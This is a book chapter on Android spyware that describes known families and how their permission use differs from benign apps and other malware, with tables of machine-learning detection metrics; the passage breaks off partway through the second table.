<html><head></head><body>
<div id="book-content">
<div id="sbo-rt-content"><h2 class="h2" id="ch08"><span epub:type="pagebreak" id="page_219"/><strong><span class="big">8</span><br/>SPYWARE</strong></h2>&#13;
<div class="image1"><img src="../images/common.jpg" alt="Image" width="189" height="189"/></div>&#13;
<p class="noindentsa">Spyware is a form of malware whose goal is to gather specific information from as many users as possible. Attackers might use this information in a variety of ways, such as to send phishing messages purporting to come from the victim or to steal money from a victim’s bank account.</p>&#13;
<p class="indent">Some spyware falls into multiple categories. For example, you’ll commonly find it acting as a banking trojan or as a backdoor. From a detection perspective, this can cause machine learning features for the various malware categories to overlap, so you’ll rarely find a clean separation between the different types of malware and their properties.</p>&#13;
<h3 class="h3" id="ch08lev1"><strong>Spyware Families</strong></h3>&#13;
<p class="noindent">This section covers prominent spyware families we didn’t discuss in <a href="ch02.xhtml">Chapter 2</a>, starting with UaPush, one of the first widespread examples on the platform. Beginning in 2011, UaPush sent text messages and stole user information from infected devices. It was distributed as an SDK that made its way onto devices via apps that used it as part of an advertisement-based profit sharing deal.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_220"/>Described by F-Secure in 2013, Pincer is malware that pretends to be a security certificate under the name <em>Certificate.apk</em>. Its spyware functions include capturing the IMEI, serial number, and Android version of the device it has compromised, along with the user’s phone number, carrier, and other information. It can also check to see if it’s being run in a sandbox. Notably, Pincer intercepts SMS traffic and forwards it to a command-and-control server, which can in principle enable hackers to compromise two-factor authentication and show misleading messages to the victim to keep them in the dark.</p>&#13;
<p class="indent">The HeHe malware also uses its spyware features to thwart two-factor authentication. It infiltrates phones by pretending that it is providing a security update to the operating system. To exploit its ability to intercept SMS traffic and phone calls, it downloads a list of interesting phone numbers from its command-and-control center, including numbers of banks, allowing it to intercept two-factor authentication events as well as phone calls made to warn the victim of suspicious activity.</p>&#13;
<p class="indent">USBCleaver, also discovered by F-Secure in 2013, makes its way onto devices via apps distributed by third-party app stores or other malicious apps present on a compromised device. Interestingly, when the infected device is connected to a computer, USBCleaver is able to steal browser and Wi-Fi passwords from it over USB and ship them to a command-and-control server.</p>&#13;
<p class="indent">Though first noticed in 2014, Acecard did nothing malicious for several months. It masqueraded as various benign apps, such as games or fake Flash players, and after installation prompted the device owner for administrator privileges. In 2015, it started to exhibit malicious behavior. To operate as a banking trojan, it stole information from users, for example by overlaying social media login windows with fake ones. Kaspersky has thoroughly described this spyware in a series of 2016 blog posts, starting with “Acecard Trojan: Android Users of Over 30 Banking and Payment Apps at Risk.”</p>&#13;
<p class="indent">A more recent example, Qibla Compass Ramadan 2022, claims to help Muslim users schedule their prayers, fasts, and other activities during the month of Ramadan. In reality, it has tracked the movements of millions of individuals and stolen sensitive files from their devices. The <em>Wall Street Journal</em> and <em>Forbes</em> have both claimed that the companies behind this malware have ties to US defense and intelligence agencies. We’ll thoroughly analyze this app’s malicious functionality later in this chapter.</p>&#13;
<h3 class="h3" id="ch08lev2"><strong>Spyware vs. Goodware</strong></h3>&#13;
<p class="noindent"><a href="ch08.xhtml#ch8fig1">Figure 8-1</a> shows the top 25 features for distinguishing Android spyware from goodware using a random forest classifier (discussed in <a href="ch05.xhtml">Chapter 5</a>).</p>&#13;
<div class="image"><img id="ch8fig1" src="../images/ch08fig01.jpg" alt="Image" width="1894" height="936"/></div>&#13;
<p class="figcap"><em>Figure 8-1: Top 25 features that best distinguish Android spyware from goodware</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_221"/><span epub:type="pagebreak" id="page_222"/>As you can see, 14 of these features are permission-related, 4 are static, and 2 are dynamic. We’ll focus on the permission-related features in our discussion.</p>&#13;
<h4 class="h4" id="ch08lev1sec1"><strong><em>Permission-Related Features</em></strong></h4>&#13;
<p class="noindent">Many of the most important features for distinguishing spyware from goodware involve permissions, and four of these are related to SMS capabilities. The <code>SEND_SMS</code>, <code>RECEIVE_SMS</code>, <code>WRITE_SMS</code>, and <code>READ_SMS</code> permissions enable spyware to receive and read messages (from banks and online marketplaces, for example) to gather information that the apps can subsequently send to their command-and-control center. Once at the command-and-control center, the malware developers may sell such information online and/or use it to commit various types of fraud, such as credit card or banking fraud. The <code>WRITE_SMS</code> and <code>SEND_SMS</code> permissions could also be used, for example, to write and send phishing URLs from the device owner’s phone to their contacts with the aim of infecting the contacts’ devices. The probability of spyware requesting these four permissions is much higher than the probability of goodware requesting the same permissions.</p>&#13;
<p class="indent">File size is an important factor, too. <a href="ch08.xhtml#ch8fig1">Figure 8-1</a> shows us that spyware tends to be much smaller than goodware. We speculate that this is because spyware requires fewer space-intensive resources, like the high-resolution media often required by legitimate applications. Spyware may also use fewer third-party SDKs, which would further reduce their file size.</p>&#13;
<p class="indent">As mentioned in the previous chapter, the <code>READ_PHONE_STATE</code> permission enables hackers to capture device information like IMEI and IMSI numbers. The probability of spyware requesting these permissions is more than twice that of goodware. These values can be particularly useful when selling and buying stolen data, as the unique nature of these hardware identifiers makes them handy primary keys to use to join datasets from different sources.</p>&#13;
<p class="indent">Likewise, spyware requests the <code>GET_TASKS</code> permission more than three times as often as goodware does. This permission, which we encountered in the previous chapter, enables the app to see what processes are running on the device. It could use this to, for example, detect processes associated with antivirus programs or track app usage data to collect and sell to marketers. Note, though, that this permission has been deprecated since Android 5.0 (Lollipop), and therefore is unlikely to have any impact at the time of this writing.</p>&#13;
<p class="indent">The <code>SYSTEM_ALERT_WINDOW</code> permission is another one that is requested more than twice as frequently by spyware than by goodware. Spyware can use it to steal user IDs, passwords, credit card details, bank account numbers, and more by displaying pop-up windows over the top of other applications that the user assumes are related to those apps. You’ll commonly see&#13;
<span epub:type="pagebreak" id="page_223"/>this behavior in bank phishing malware; as we noted, spyware often serves multiple functions, and cleanly separating its features by category isn’t always possible.</p>&#13;
<p class="indent">Lastly, although its use is relatively uncommon in both categories, spyware requests the privileged <code>MOUNT_UNMOUNT_FILESYSTEMS</code> permission more than twice as frequently as goodware. Malware developers can use this permission to load utility software like BusyBox onto the device, assuming the spyware has elevated its privileges.</p>&#13;
<p class="indent"><a href="ch08.xhtml#ch8fig1">Figure 8-1</a> showed a few other significant permissions that spyware requests more often than goodware, as well as features such as the following:</p>&#13;
<div class="bq">&#13;
<p class="noindentin"><span class="codestrong1">num_std_permissions</span> The number of permissions defined by official Android developer guides declared in the manifest, regardless of whether they’re considered dangerous or not</p>&#13;
<p class="noindentin"><span class="codestrong1">num_std_permissions_dangerous</span> The number of permissions deemed dangerous because they grant apps increased access to restricted data or allow it to carry out restricted actions</p>&#13;
<p class="noindentin"><span class="codestrong1">num_non_std_permissions</span> The number of permissions declared in the manifest that are defined by sources other than the official Android SDK</p>&#13;
</div>&#13;
<h4 class="h4" id="ch08lev1sec2"><strong><em>Prediction Efficacy</em></strong></h4>&#13;
<p class="noindent"><a href="ch08.xhtml#ch8tab1">Table 8-1</a> shows the performance of various machine learning classifiers at predicting whether an app is spyware or goodware, given different sets of features.</p>&#13;
<p class="tabcap" id="ch8tab1"><strong>Table 8-1:</strong> Metrics for Evaluating Android Spyware vs. Goodware</p>&#13;
<table class="all">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:20%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
</colgroup>&#13;
<thead>&#13;
<tr>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Feature set</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Best classifier</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>AUC</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Precision</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Recall</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>F1</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>FPR</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>FNR</strong></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">API package</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">RF</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9959</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9786</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9741</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9764</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.0214</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.0338</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Static (S)</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9911</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9627</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9621</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9624</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0373</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0381</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Dynamic (D)</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">RF</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9532</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8527</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9708</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9079</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1473</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.0342</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">S + D</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9943</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9620</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9711</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9665</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0380</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0294</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">API + S + D</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.9982</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.9824</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.9848</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.9836</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.0176</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.0187</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">TSG</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">RF</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9953</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9800</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9691</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9745</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0200</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0401</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">LM</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">RF</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8625</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7342</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9266</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8193</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.2658</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1327</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">FC</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">RF</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9896</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9645</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9590</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9617</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0355</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0500</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">CG</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">GBDT</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9629</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9329</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9339</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9334</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.0671</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.0812</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">API + S + D + TSG</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9989</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9894</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9875</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9884</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0106</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0153</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">API + S + D + LM</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9981</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9824</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9845</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9834</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.0176</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.0191</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">API + S + D + FC</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9982</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9824</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9856</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9840</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0176</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0177</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">API + S + D + CG</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.9983</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.9840</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.9845</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.9842</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.0160</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.0190</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">All features</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9988</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9875</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9864</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9869</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0125</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0167</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Best late fusion</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">1.0000</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">1.0000</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">1.0000</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent"><strong>1.0000</strong></p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.0000</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.0000</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_224"/>As in the previous chapter, the rows indicate the types of features used: API package, static, dynamic, TSG-based, landmark-based, feature clustering–based, and correlation graph–based. We also show combinations of these features. We’ve indicated the best classifier for each type or combination of features and provided various predictive performance metrics. The final row shows the results of late fusion.</p>&#13;
<p class="indent">As you can see, late fusion using the XGBoost classifier provides excellent results, making virtually no mistakes on the data we used during testing. This is surprising; almost no machine learning algorithms yield 100 percent performance.</p>&#13;
<h3 class="h3" id="ch08lev3"><strong>Spyware vs. Other Malware</strong></h3>&#13;
<p class="noindent">We now turn to the question of how spyware differs from other forms of malware. <a href="ch08.xhtml#ch8fig2">Figure 8-2</a> shows the top 25 features used for this purpose.</p>&#13;
<p class="indent">Here too, the majority of the features that distinguish spyware from other malware (13 of the top 25) are linked to permissions, so we’ll focus on those.</p>&#13;
<h4 class="h4" id="ch08lev1sec3"><strong><em>Permission-Related Features</em></strong></h4>&#13;
<p class="noindent">If you look at the classifier’s results, you might notice something interesting: SMS-related permissions are conspicuously absent. This is because many types of malware, and not just spyware, seek these permissions.</p>&#13;
<p class="indent">The <code>CALL_PHONE</code> permission is one of the distinguishing features. We see that spyware requests this almost three times as often as other types of malware. This permission can be used, among other things, to disconnect a phone call (for example, if a bank calls to verify that the customer made a purchase). In spyware we’ve observed, the <code>CALL_PHONE</code> permission is usually sought by apps with advanced capabilities that cross into the trojan or backdoor categories.</p>&#13;
<p class="indent">An important permission not covered in preceding chapters, <code>ACCESS_FINE_LOCATION</code>, provides extremely valuable information. An app with this permission can usually identify the victim’s location to within a few meters. Attackers could use this information for many purposes. For example, they could build a model of the days of the week and times at which the victim is usually present in a particular location (say, at a specific coffee shop from 11 <small>AM</small> to 12 <small>PM</small> on Mondays or at a meeting in building B on the Google campus from 3 <small>PM</small> to 4 <small>PM</small> on Thursdays). They could also infer what stores victims visit and use this to determine whether they are good targets: for instance, a user who enters relatively expensive stores, such as Whole Foods, Nordstrom, and Neiman Marcus, may draw more attention because they appear wealthier than one who mainly frequents convenience stores like 7-Eleven. We believe this fine-grained location information about individuals is the most sought-after data on data markets.</p>&#13;
<div class="image"><img id="ch8fig2" src="../images/ch08fig02.jpg" alt="Image" width="1901" height="943"/></div>&#13;
<p class="figcap"><em>Figure 8-2: Top 25 features that best distinguish Android spyware from other malware</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_225"/><span epub:type="pagebreak" id="page_226"/>The <code>RECORD_AUDIO</code> permission is a potentially creepy one. Many legitimate apps seek to record audio, such as voice recorders and online conferencing apps. However, if malware records a phone call, adversaries could learn sensitive information. Though no kind of malware frequently seeks this permission, the probability of spyware requesting it is much higher than the probability of other malware requesting it.</p>&#13;
<p class="indent">The <code>READ_EXTERNAL_STORAGE</code> and <code>WRITE_EXTERNAL_STORAGE</code> permissions are sought almost equally by spyware and other malware. These permissions enable malware to read from and write to the device’s SD card, where other apps store potentially sensitive files. One particularly interesting use of <code>WRITE_EXTERNAL_STORAGE</code> that we’ve seen is in an advanced spyware and trojan app called Claco, which stores files on the SD card in hopes of infecting Windows systems connected to the Android device over USB. Note that after Android introduced scoped storage in Android 10, most of the previously accessible sensitive files should no longer be accessible to unprivileged spyware apps.</p>&#13;
<p class="indent">We discussed the important <code>KILL_BACKGROUND_PROCESSES</code> permission in the previous chapter. Spyware can use it to kill background processes owned by a given app, like an antivirus app. Lastly, some features that help us distinguish spyware from goodware can also help us distinguish spyware from other malware. These include the <code>SYSTEM_ALERT_WINDOW</code>, <code>MOUNT_UNMOUNT_FILESYSTEMS</code>, <code>READ_PHONE_STATE</code>, and <code>ACCESS_NETWORK_STATE</code> permissions, as well as features such as <code>filesize</code>, <code>num_std_permissions</code>, and <code>num_non_std_permissions</code>. The number of dangerous permissions sought, a top feature for distinguishing spyware from goodware, seems less important when distinguishing spyware from other forms of malware.</p>&#13;
<h4 class="h4" id="ch08lev1sec4"><strong><em>Prediction Efficacy</em></strong></h4>&#13;
<p class="noindent"><a href="ch08.xhtml#ch8tab2">Table 8-2</a> shows the predictive performance of machine learning classifiers when tasked with separating spyware from other forms of malware.</p>&#13;
<p class="indent">While the best F1 score is a little lower than the result we received when distinguishing spyware from goodware, the drop is negligible. The results suggest that machine learning is able to separate spyware from goodware very well.</p>&#13;
<p class="tabcap" id="ch8tab2"><strong>Table 8-2:</strong> Metrics for Evaluating Android Spyware vs. Other Malware</p>&#13;
<table class="all">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:20%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
</colgroup>&#13;
<thead>&#13;
<tr>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Feature set</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Best classifier</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>AUC</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Precision</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Recall</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>F1</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>FPR</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>FNR</strong></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">API package</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">GBDT</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9101</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8475</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8379</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8427</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1525</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1610</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Static (S)</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9156</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8513</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8401</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8456</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1487</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1592</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Dynamic (D)</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">MLP</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8394</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8100</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6378</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7137</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1900</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.3008</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">S + D</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9138</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8560</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8391</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8475</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1440</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1591</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">API + S + D</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.9447</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8794</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8794</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8794</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.1206</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.1214</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">TSG</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">RF</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6943</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6567</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6635</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6601</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.3433</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.3423</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">LM</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">GBDT</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8231</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7353</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7540</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7445</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.2647</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.2541</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">FC</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">SVM</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.5047</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.5028</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">1.0000</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6692</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.4972</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.0000</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">CG</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9431</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8789</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8822</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8805</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1211</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1190</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">API + S + D + TSG</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9457</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8845</p></td>&#13;
